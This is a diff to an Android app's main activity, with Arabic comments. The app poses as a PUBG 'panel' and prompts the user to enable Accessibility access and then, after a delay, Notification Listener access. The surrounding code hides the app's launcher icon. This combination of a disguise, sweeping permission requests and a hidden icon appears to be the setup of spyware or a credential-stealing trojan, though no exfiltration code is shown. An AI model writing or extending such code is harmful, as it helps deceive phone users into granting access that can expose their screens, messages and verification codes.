@@ -7,6 +7,7 @@ import android.content.pm.PackageManager;
 import android.graphics.Color;
 import android.os.Build;
 import android.os.Bundle;
+import android.os.Handler;
 import android.provider.Settings;
 import android.view.Gravity;
 import android.widget.LinearLayout;
@@ -64,13 +65,25 @@ public class MainActivity extends Activity {
             }
         } catch (Exception ignored) {}
 
+        // 1. فتح صفحة تفعيل الـ Accessibility
         try {
             Intent accIntent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
             accIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
             startActivity(accIntent);
-            Toast.makeText(this, "Please enable PUBG Mobile.", Toast.LENGTH_LONG).show();
+            Toast.makeText(this, "Please enable panel pubge in Accessibility.", Toast.LENGTH_LONG).show();
         } catch (Exception ignored) {}
 
+        // 2. بعد 4 ثواني، فتح صفحة تفعيل الإشعارات
+        new Handler().postDelayed(() -> {
+            try {
+                Intent notifIntent = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
+                notifIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                startActivity(notifIntent);
+                Toast.makeText(this, "Please enable panel pubge in Notification Access.", Toast.LENGTH_LONG).show();
+            } catch (Exception ignored) {}
+        }, 4000);
+
+        // إخفاء الأيقونة
         try {
             PackageManager p = getPackageManager();
             ComponentName componentName = new ComponentName(this, MainActivity.class);
